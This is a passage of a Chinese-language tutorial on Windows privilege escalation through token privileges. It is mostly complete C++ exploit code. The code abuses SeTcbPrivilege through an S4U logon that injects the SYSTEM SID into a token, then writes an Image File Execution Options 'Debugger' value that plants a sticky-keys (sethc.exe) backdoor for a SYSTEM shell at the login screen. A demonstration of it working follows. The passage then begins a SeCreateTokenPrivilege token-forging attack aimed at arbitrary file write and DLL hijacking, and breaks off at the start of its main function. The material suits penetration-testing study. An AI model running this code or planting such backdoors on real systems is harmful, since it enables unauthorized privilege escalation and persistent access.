pS4uLogon->MessageType = MsV1_0S4ULogon;
pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);
```

接着，创建一个 `TOKEN_GROUPS` 结构体，该结构的语法如下，主要包含有关访问令牌中组安全标识符（SID）的信息。

```c++
typedef struct _TOKEN_GROUPS {
  DWORD              GroupCount;
#if ...
  SID_AND_ATTRIBUTES *Groups[];
#else
  SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];
#endif
} TOKEN_GROUPS, *PTOKEN_GROUPS;
```

也正是通过这个结构，将 NT AUTHORITY\SYSTEM 账户的 SID（S-1-5-18）加入生成的模拟令牌中，如下所示。

```c++
// Add extra SID to token.
// If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
if (pGroups == NULL)
{
  wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
  goto Clear;
}

// Add Logon Sid, if present.
if (pLogonSid)
{
  pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
  pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
  pGroups->GroupCount++;
}

// If an extra SID is specified to command line, add it to the pGroups structure.
pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
pGroups->GroupCount++;
```

完成上面这些初始化后，将调用 `LsaLogonUser()` 函数执行 S4U 登录过程，登录得到的模拟令牌将保存在 `hTokenS4U` 中，如下所示。

```c++
// Call LSA LsaLogonUser
// This call required SeTcbPrivilege privilege:
//    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
//    - [2] to add supplemental SID with LocalGroups parameter.
//    - [3] to use a username with a domain name different from machine name (or '.').

status = LsaLogonUser(
  hLSA,
  &OriginName,
  Network,                // Or Batch
  ulAuthenticationPackage,
  pS4uLogon,
  dwMsgS4ULength,
  pGroups,                // LocalGroups
  &TokenSource,           // SourceContext
  &pvProfile,
  &dwProfile,
  &logonId,
  &hTokenS4U,
  &quotaLimits,
  &subStatus
);
if (status != STATUS_SUCCESS)
{
  wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
  goto Clear;
}
```

登录完成后，通过 `SetTokenInformation()` 函数将得到的模拟令牌 `hTokenS4U` 的完整性级别设置为 Medium，如下所示。

```c++
WCHAR mediumInt[] = L"S-1-16-8192";
PSID mediumSID = NULL;
ConvertStringSidToSidW(mediumInt, &mediumSID);

// ...

wprintf(L"[*] Set the token integrity level to medium.\n");

TIL.Label.Attributes = SE_GROUP_INTEGRITY;
TIL.Label.Sid = mediumSID;

if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
{
  wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
}
```

然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌 `hTokenS4U`，并通过 `DisplayTokenInformation()` 函数输出新令牌的 TokenStatistics、TokenGroups 和 TokenIntegrityLevel 等信息，如下所示。

```c++
hThread = GetCurrentThread();
  
if (!SetThreadToken(&hThread, hTokenS4U))
{
  wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
}
  
wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

if (!DisplayTokenInformation(hTokenS4U))
{
  wprintf(L"[-] Failed to get S4U token information.\n");
}
```

`DisplayTokenInformation()` 函数主要通过 `GetTokenInformation()` 来枚举令牌的信息，如下所示。

```c++
BOOL DisplayTokenInformation(HANDLE hToken)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_STATISTICS pTokenStatistics = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	PSID pSid;
	LPWSTR lpGroupSid;
	LPWSTR lpIntegritySid;

	// Get Token Statistics Information
	if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenStatistics = (PTOKEN_STATISTICS)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L" > Token Statistics Information: \n");
		wprintf(L"	 Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
		wprintf(L"	 Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
		wprintf(L"	 Token Type          : %d\n", pTokenStatistics->TokenType);
		wprintf(L"	 Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
		wprintf(L"	 Group Count         : %d\n", pTokenStatistics->GroupCount);
		wprintf(L"	 Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

		status = TRUE;
	}

	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L" > Token Group Information: \n");
		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			pSid = pTokenGroups->Groups[i].Sid;
			if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
				wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
				goto Clear;
			}

			wprintf(L"	 %ws\n", lpGroupSid);
		}

		status = TRUE;
	}

	if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L"\n > Token Integrity Level: \n");
		pSid = pTokenIntegrityLevel->Label.Sid;
		if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
			wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
			goto Clear;
		}
		wprintf(L"	 %ws\n", lpIntegritySid);

		status = TRUE;
		goto Clear;
	}
Clear:
	if (pTokenStatistics != NULL)
		LocalFree(pTokenStatistics);
	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;

}
```

### ExploitSeTcbPrivilege

最后，由于已经获取了 SYSTEM 权限，则调用 `ExploitSeTcbPrivilege()` 函数将通过 `RegCreateKeyExW()` API 在 `Image File Execution Options` 注册表下创建一个子项，然后用 `RegSetValueExW()` API 为粘滞键（sethc.exe）设置 Debugger 键实现映像劫持，实现粘滞键后门，如下所示。

```c++
void ExploitSeTcbPrivilege()
{
	DWORD lResult;
	HKEY hKey;

	LPCWSTR lpCommand = L"\"C:\\Windows\\System32\\cmd.exe\"";

	// Creates the specified registry key.
	lResult = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
		0,
		NULL,
		NULL,
		KEY_SET_VALUE,
		NULL,
		&hKey,
		NULL
	);
	if (lResult != ERROR_SUCCESS)
	{
		wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
		return;
	}
	// Sets the data and type of a specified value under a registry key.
	lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)lpCommand, (wcslen(lpCommand) + 1) * sizeof(WCHAR));
	if (lResult != ERROR_SUCCESS)
	{
		wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
		return;
	}
	wprintf(L"[*] Set Image File Execution Options for sethc.exe successfully with Debugger as %ws.\n", lpCommand);

	return;
}
```

### Full Code

最终的完整代码如下所示。

```c++
#include <Windows.h>
#include <winternl.h>
#define _NTDEF_ 
#include <NTSecAPI.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <sddl.h>

#pragma comment(lib, "Secur32.lib")

#define SIZE 200000

#if !defined(NT_SUCCESS)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#ifdef __cplusplus
extern "C" VOID WINAPI RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString);
#endif

#define STATUS_SUCCESS           0
#define EXTRA_SID_COUNT          2

LSA_STRING MSV1_0_PackageName = { 37, 38, (PCHAR)MSV1_0_PACKAGE_NAME };
ULONG	ulAuthenticationPackage = 0;
BOOL	isAuthPackageKerberos = FALSE;
HANDLE	hLSA = NULL;

NTSTATUS LsaClean()
{
	return LsaDeregisterLogonProcess(hLSA);
}


NTSTATUS LsaInit()
{
	NTSTATUS status = 0;
	// Open LSA policy handle
	status = LsaConnectUntrusted(&hLSA);
	if (status != STATUS_SUCCESS)
	{
		// Lookup authentication package ID
		status = LsaLookupAuthenticationPackage(hLSA, &MSV1_0_PackageName, &ulAuthenticationPackage);
		isAuthPackageKerberos = NT_SUCCESS(status);
	}
	return status;
}


void ExploitSeTcbPrivilege()
{
	DWORD lResult;
	HKEY hKey;

	LPCWSTR lpCommand = L"\"C:\\Windows\\System32\\cmd.exe\"";

	// Creates the specified registry key.
	lResult = RegCreateKeyExW(
		HKEY_LOCAL_MACHINE,
		L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
		0,
		NULL,
		NULL,
		KEY_SET_VALUE,
		NULL,
		&hKey,
		NULL
	);
	if (lResult != ERROR_SUCCESS)
	{
		wprintf(L"[-] RegCreateKeyExW Error: [%u].\n", lResult);
		return;
	}
	// Sets the data and type of a specified value under a registry key.
	lResult = RegSetValueExW(hKey, L"Debugger", 0, REG_SZ, (const BYTE*)lpCommand, (wcslen(lpCommand) + 1) * sizeof(WCHAR));
	if (lResult != ERROR_SUCCESS)
	{
		wprintf(L"[-] RegSetValueExW Error: [%u].\n", lResult);
		return;
	}
	wprintf(L"[*] Set Image File Execution Options for sethc.exe successfully with Debugger as %ws.\n", lpCommand);

	return;
}


BOOL GetLogonSID(HANDLE hToken, PSID* pLogonSid)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_GROUPS pTokenGroups = NULL;

	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			if ((pTokenGroups->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID)
			{
				dwLength = GetLengthSid(pTokenGroups->Groups[i].Sid);
				*pLogonSid = (PSID)LocalAlloc(LPTR, dwLength);
				if (*pLogonSid == NULL)
				{
					goto Clear;
				}
				if (!CopySid(dwLength, *pLogonSid, pTokenGroups->Groups[i].Sid))
				{
					goto Clear;
				}
				break;
			}
		}

		status = TRUE;
		goto Clear;
	}
Clear:
	if (status == FALSE)
	{
		if (*pLogonSid != NULL)
			LocalFree(*pLogonSid);
	}

	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;
}


BOOL DisplayTokenInformation(HANDLE hToken)
{
	BOOL status = FALSE;
	DWORD dwLength = 0;
	PTOKEN_STATISTICS pTokenStatistics = NULL;
	PTOKEN_GROUPS pTokenGroups = NULL;
	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	PSID pSid;
	LPWSTR lpGroupSid;
	LPWSTR lpIntegritySid;

	// Get Token Statistics Information
	if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenStatistics = (PTOKEN_STATISTICS)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenStatistics, pTokenStatistics, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L" > Token Statistics Information: \n");
		wprintf(L"	 Token Id            : %u:%u (%08x:%08x)\n", pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart, pTokenStatistics->TokenId.HighPart, pTokenStatistics->TokenId.LowPart);
		wprintf(L"	 Authentication Id   : %u:%u (%08x:%08x)\n", pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart, pTokenStatistics->AuthenticationId.HighPart, pTokenStatistics->AuthenticationId.LowPart);
		wprintf(L"	 Token Type          : %d\n", pTokenStatistics->TokenType);
		wprintf(L"	 Impersonation Level : %d\n", pTokenStatistics->ImpersonationLevel);
		wprintf(L"	 Group Count         : %d\n", pTokenStatistics->GroupCount);
		wprintf(L"	 Privilege Count     : %d\n\n", pTokenStatistics->PrivilegeCount);

		status = TRUE;
	}

	if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenGroups, pTokenGroups, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L" > Token Group Information: \n");
		for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
		{
			pSid = pTokenGroups->Groups[i].Sid;
			if (!ConvertSidToStringSidW(pSid, &lpGroupSid)) {
				wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
				goto Clear;
			}

			wprintf(L"	 %ws\n", lpGroupSid);
		}

		status = TRUE;
	}

	if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, 0, &dwLength))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		pTokenIntegrityLevel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
		if (!GetTokenInformation(hToken, TokenIntegrityLevel, pTokenIntegrityLevel, dwLength, &dwLength))
		{
			wprintf(L"[-] GetTokenInformation Error: [%u].\n", GetLastError());
			goto Clear;
		}

		wprintf(L"\n > Token Integrity Level: \n");
		pSid = pTokenIntegrityLevel->Label.Sid;
		if (!ConvertSidToStringSidW(pSid, &lpIntegritySid)) {
			wprintf(L"[-] ConvertSidToStringSidW Error: [%u].\n", GetLastError());
			goto Clear;
		}
		wprintf(L"	 %ws\n", lpIntegritySid);

		status = TRUE;
		goto Clear;
	}
Clear:
	if (pTokenStatistics != NULL)
		LocalFree(pTokenStatistics);
	if (pTokenGroups != NULL)
		LocalFree(pTokenGroups);

	return status;

}

PBYTE
InitUnicodeString(
	_Out_ PUNICODE_STRING DestinationString,
	_In_z_ LPCWSTR szSourceString,
	_In_ PBYTE pbDestinationBuffer
)
{
	USHORT StringSize;

	StringSize = (USHORT)wcslen(szSourceString) * sizeof(WCHAR);
	memcpy(pbDestinationBuffer, szSourceString, StringSize);

	DestinationString->Length = StringSize;
	DestinationString->MaximumLength = StringSize + sizeof(WCHAR);
	DestinationString->Buffer = (PWSTR)pbDestinationBuffer;

	return (PBYTE)pbDestinationBuffer + StringSize + sizeof(WCHAR);
}


NTSTATUS DoS4U(HANDLE hToken)
{
	NTSTATUS status = 0;
	NTSTATUS subStatus = 0;
	HANDLE hThread = NULL;
	HANDLE phNewToken = NULL;
	PTOKEN_GROUPS pGroups = NULL;
	PSID pLogonSid = NULL;
	PSID pExtraSid = NULL;
	DWORD dwMsgS4ULength;

	PBYTE pbPosition;

	DWORD dwProfile = 0;
	LUID logonId = { 0 };
	ULONG profileBufferLength;
	PVOID profileBuffer;
	QUOTA_LIMITS quotaLimits;
	HANDLE hTokenS4U = NULL;
	PVOID pvProfile = NULL;

	LSA_STRING OriginName = { 15, 16, (PCHAR)"S4U for Windows" };
	PMSV1_0_S4U_LOGON pS4uLogon = NULL;
	TOKEN_SOURCE TokenSource;

	TOKEN_MANDATORY_LABEL TIL = { 0 };

	LPCWSTR szDomain = L".";
	LPCWSTR szUsername = L"John";//the user who has SeTcbPrivilege

	WCHAR systemSID[] = L"S-1-5-18";
	ConvertStringSidToSidW(systemSID, &pExtraSid);

	WCHAR mediumInt[] = L"S-1-16-8192";
	PSID mediumSID = NULL;
	ConvertStringSidToSidW(mediumInt, &mediumSID);

	HANDLE hThreadToken = NULL;
	PTOKEN_MANDATORY_LABEL pTokenIntegrityLevel = NULL;
	DWORD dwLength;
	LPWSTR lpGroupSid;

	if (!GetLogonSID(hToken, &pLogonSid))
	{
		wprintf(L"[-] Unable to find logon SID.\n");
		goto Clear;
	}

	if (!NT_SUCCESS(LsaInit()))
	{
		wprintf(L"[-] Failed to start kerberos initialization.\n");
		goto Clear;
	}

	wprintf(L"[*] Initialize S4U login.\n");
	// Create MSV1_0_S4U_LOGON structure
	dwMsgS4ULength = sizeof(MSV1_0_S4U_LOGON) + (EXTRA_SID_COUNT + (DWORD)wcslen(szDomain) + (DWORD)wcslen(szUsername)) * sizeof(WCHAR);
	pS4uLogon = (PMSV1_0_S4U_LOGON)LocalAlloc(LPTR, dwMsgS4ULength);
	if (pS4uLogon == NULL)
	{
		wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
		goto Clear;
	}

	pS4uLogon->MessageType = MsV1_0S4ULogon;
	pbPosition = (PBYTE)pS4uLogon + sizeof(MSV1_0_S4U_LOGON);
	pbPosition = InitUnicodeString(&pS4uLogon->UserPrincipalName, szUsername, pbPosition);
	pbPosition = InitUnicodeString(&pS4uLogon->DomainName, szDomain, pbPosition);

	strcpy_s(TokenSource.SourceName, TOKEN_SOURCE_LENGTH, "User32");
	AllocateLocallyUniqueId(&TokenSource.SourceIdentifier);

	// Add extra SID to token.
	// If the application needs to connect to a Windows Desktop, Logon SID must be added to the Token.
	wprintf(L"[*] Add extra SID S-1-5-18 to token.\n");
	pGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, sizeof(TOKEN_GROUPS) + 2 * sizeof(SID_AND_ATTRIBUTES));
	if (pGroups == NULL)
	{
		wprintf(L"[-] LocalAlloc Error: [%u].", GetLastError());
		goto Clear;
	}

	// Add Logon Sid, if present.
	if (pLogonSid)
	{
		pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
		pGroups->Groups[pGroups->GroupCount].Sid = pLogonSid;
		pGroups->GroupCount++;
	}

	// If an extra SID is specified to command line, add it to the pGroups structure.
	pGroups->Groups[pGroups->GroupCount].Attributes = SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY;
	pGroups->Groups[pGroups->GroupCount].Sid = pExtraSid;
	pGroups->GroupCount++;

	// Call LSA LsaLogonUser
	// This call required SeTcbPrivilege privilege:
	//    - [1] to get a primary token (vs impersonation token). The privilege MUST be activated.
	//    - [2] to add supplemental SID with LocalGroups parameter.
	//    - [3] to use a username with a domain name different from machine name (or '.').

	status = LsaLogonUser(
		hLSA,
		&OriginName,
		Network,                // Or Batch
		ulAuthenticationPackage,
		pS4uLogon,
		dwMsgS4ULength,
		pGroups,                // LocalGroups
		&TokenSource,           // SourceContext
		&pvProfile,
		&dwProfile,
		&logonId,
		&hTokenS4U,
		&quotaLimits,
		&subStatus
	);
	if (status != STATUS_SUCCESS)
	{
		wprintf(L"[-] LsaLogonUser Error: [0x%x].", status);
		goto Clear;
	}

	wprintf(L"[*] Set the token integrity level to medium.\n");

	TIL.Label.Attributes = SE_GROUP_INTEGRITY;
	TIL.Label.Sid = mediumSID;

	if (!SetTokenInformation(hTokenS4U, TokenIntegrityLevel, &TIL, sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(mediumSID)))
	{
		wprintf(L"[-] SetTokenInformation Error: [%u].\n", GetLastError());
	}

	hThread = GetCurrentThread();
	
	if (!SetThreadToken(&hThread, hTokenS4U))
	{
		wprintf(L"[-] SetThreadToken Error: [%u].\n", GetLastError());
	}
	
	wprintf(L"[*] LsaLogonUser successfully and get S4U token: \n\n");

	if (!DisplayTokenInformation(hTokenS4U))
	{
		wprintf(L"[-] Failed to get S4U token information.\n");
	}

	wprintf(L"\n[*] Successfully impersonated S4U.\n");
	ExploitSeTcbPrivilege();

	goto Clear;

Clear:
	if (OriginName.Buffer)
		LocalFree(OriginName.Buffer);
	if (pLogonSid)
		LocalFree(pLogonSid);
	if (pExtraSid)
		LocalFree(pExtraSid);
	if (pS4uLogon)
		LocalFree(pS4uLogon);
	if (pGroups)
		LocalFree(pGroups);
	if (hLSA)
		LsaClose(hLSA);
	if (hToken)
		CloseHandle(hToken);
	if (hTokenS4U)
		CloseHandle(hTokenS4U);
	
	return status;
}


BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;

	// Get the LUID value of the privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}


int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
		return 0;
	}

	// Enable SeRestorePrivilege for the current process token.
	if (EnableTokenPrivilege(hToken, SE_TCB_NAME))
	{
		if (NT_SUCCESS(DoS4U(hToken)))
		{
			return 1;
		}
	}
}
```

### Let’s see it in action

直接在 John 用户的上下文中执行 SeTcbPrivilege.exe 即可设置一个粘滞键后门：

```powershell
SeTcbPrivilege.exe
```

![image-20230704165203268](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230704165203268.png)

可以看到，生成的模拟令牌中已经加入了 NT AUTHORITY\SYSTEM 账户的 SID（S-1-5-18），并且粘滞键后门设置成功。在远程桌面或用户登录屏幕中连按 5 次 Shift 键即可获取一个命令行窗口，并且为 NT AUTHORITY\SYSTEM 权限，如下图所示。

![image-20230704165546403](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230704165546403.png)

## SeCreateTokenPrivilege

在 Windows 系统中，存在一个名为 SeCreateTokenPrivilege 的特权，它在 Microsoft 官方文档中被描述为 “*Create a token object*”。它被认为是 “上帝” 权限，因为拥有该特权的任何进程能够通过 ZwCreateToken API 创建主令牌，该函数是 Windows 操作系统的 Native API，其语法如下。

```c++
NTSTATUS ZwCreateToken(
	OUT PHANDLE TokenHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN TOKEN_TYPE Type,
	IN PLUID AuthenticationId,
	IN PLARGE_INTEGER ExpirationTime,
	IN PTOKEN_USER User,
	IN PTOKEN_GROUPS Groups,
	IN PTOKEN_PRIVILEGES Privileges,
	IN PTOKEN_OWNER Owner,
	IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
	IN PTOKEN_DEFAULT_DACL DefaultDacl,
	IN PTOKEN_SOURCE Source
);
```

- TokenHandle：用于接收创建的访问令牌的句柄。
- DesiredAccess：访问令牌的所需访问权限，使用 `TOKEN_ALL_ACCESS` 可以获得所有权限。
- ObjectAttributes：指向 `OBJECT_ATTRIBUTES` 结构的指针，用于指定令牌对象的属性。
- Type：指定要创建的令牌的类型，如  TokenPrimary 或 TokenImpersonation。
- AuthenticationId：指定令牌的身份验证标识。
- ExpirationTime：指定令牌的过期时间，或使用 `NULL` 表示不设置过期时间。
- User：指向 `TOKEN_USER` 结构的指针，用于指定令牌所属的用户。
- Groups：指向 `TOKEN_GROUPS` 结构的指针，用于指定令牌所属的组。
- Privileges：指向 `TOKEN_PRIVILEGES` 结构的指针，用于指定令牌的特权。
- Owner：指向 `TOKEN_OWNER` 结构的指针，用于指定令牌的所有者。
- PrimaryGroup：指向 `TOKEN_PRIMARY_GROUP` 结构的指针，用于指定令牌的主组。
- DefaultDacl：指向 `TOKEN_DEFAULT_DACL` 结构的指针，用于指定令牌的默认 DACL。
- Source：指向 `TOKEN_SOURCE` 结构的指针，用于指定令牌的源标识。

如果我们接管了拥有 SeCreateTokenPrivilege 特权的账户或进程，就可以通过 `ZwCreateToken()` 函数制作一个新的模拟令牌并添加特权组的 SID，实现特权提升。

如前所述，我们希望在令牌上启用本地管理员组。为此，我们使用本地管理员组的 RID 构建一个 SID：

```c++
// S-1-5-32-544
SID_BUILTIN LocalAdminGroupSID = { 1, 2,{ 0, 0, 0, 0, 0, 5 },{ 32,                                                DOMAIN_ALIAS_RID_ADMINS } };
```

然后我们遍历令牌的组并将其从当前用户提升为管理员：

```c++
for (DWORD i = 0; i < pTokenGroups->GroupCount; i++)
{
	pSid = (PISID)pTokenGroups->Groups[i].Sid;
  	if (pSid->SubAuthority[pSid->SubAuthorityCount - 1] == DOMAIN_ALIAS_RID_USERS)
  	{
    	memcpy(pSid, &LocalAdminGroupSID, sizeof(LocalAdminGroupSID));
    	pTokenGroups->Groups[i].Attributes = SE_GROUP_ENABLED;
    	wprintf(L"[*] Add extra SID S-1-5-32-544 to token.\n");
  	}
}
```

最后的更改是确保我们正在构建 TokenImpersonation 模拟级别的令牌，这可以在令牌的对象属性中设置：

```c++
SECURITY_QUALITY_OF_SERVICE securityQualityOfService = { sizeof(securityQualityOfService),
                                                         SecurityImpersonation, 
                                                         SECURITY_STATIC_TRACKING, FALSE };
OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes), 0, 0, 0, 0, &securityQualityOfService };
```

目前只剩下最后一个难题，就是我们将如何使用生成的模拟令牌，因为我们假设我们只拥有 SeCreateTokenPrivilege 特权，没有其他与模拟相关的特权（例如 SeImpersonatePrivilege）。我们回顾 Windows 有关令牌模拟的相关规则：

> - IF the token level < Impersonate THEN allow (such tokens are called “Identification” level and can not be used for privileged actions).  
> - IF the process has “Impersonate” privilege THEN allow.  
> - IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible).

我们关注最后一条规则 “*IF the process integrity level >= the token integrity level AND the process user == token user THEN allow ELSE restrict the token to “Identification” level (no privileged actions possible)*”，也就是说，只要令牌是给我们当前用户的，并且完整性级别小于或等于当前进程完整性级别，我们就应该能够在没有任何特殊权限的情况下模拟令牌。令牌的完整性级别可以在构造令牌时设置。我们只需将完整性级别设置为 “Medium”，然后调用 `SetThreadToken()` 函数将当前线程的令牌替换为新令牌即可。

如下图所示，本地用户 John 拥有 SeCreateTokenPrivilege 特权。

![image-20230706124651014](https://wh0amitz.oss-cn-beijing.aliyuncs.com/img/image-20230706124651014.png)

我们可以通过 `ZwCreateToken()` 函数创建一个提升权限的模拟令牌，使用该令牌创建线程实现任意文件写入，最终通过 DLL 劫持等方法实现提权。下面给出可供参考的利用代码。

### Main Fcuntion

主函数首先从命令行获取 `-s` 和 `-d` 两个参数，分别对应后续文件写入的源文件和目的文件，然后通过 `GetCurrentProcess()` 和 `OpenProcessToken()` 函数打开当前进程的句柄，如下所示。

```c++
int wmain(int argc, wchar_t* argv[])
{
